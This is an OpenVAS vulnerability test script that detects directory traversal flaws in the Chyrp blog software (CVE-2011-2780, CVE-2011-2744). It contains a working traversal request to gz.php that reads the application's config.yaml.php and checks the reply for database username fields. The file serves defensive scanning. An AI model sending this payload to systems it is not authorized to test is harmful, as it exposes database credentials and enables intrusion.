###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_chyrp_mult_dir_trav_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Chyrp Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Shashi kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902611");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_cve_id("CVE-2011-2780", "CVE-2011-2744");
  script_bugtraq_id(48672);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Chyrp Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45184");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/68565");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/68564");
  script_xref(name:"URL", value:"http://www.justanotherhacker.com/advisories/JAHx113.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to read arbitrary files
  and gain sensitive information on the affected application.");
  script_tag(name:"affected", value:"Chyrp version prior to 2.1.1");
  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user supplied input to
  'file' parameter in 'includes/lib/gz.php' and 'action' parameter in
  'index.php' before being used to include files.");
  script_tag(name:"solution", value:"Upgrade to Chyrp version 2.1.1");
  script_tag(name:"summary", value:"The host is running Chyrp and is prone to Multiple directory
  traversal vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://chyrp.net/");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

## If host not supports php application then exit
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir(make_list_unique("/blog", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/", port:port);

  if("Powered by" >< res && ">Chyrp<" >< res)
  {

    url = string(dir, "/includes/lib/gz.php?file=/themes/../includes" +
                      "/config.yaml.php");

    req = http_get(item: url, port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    if("<?php" >< res &&  "username:" >< res && "database:" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);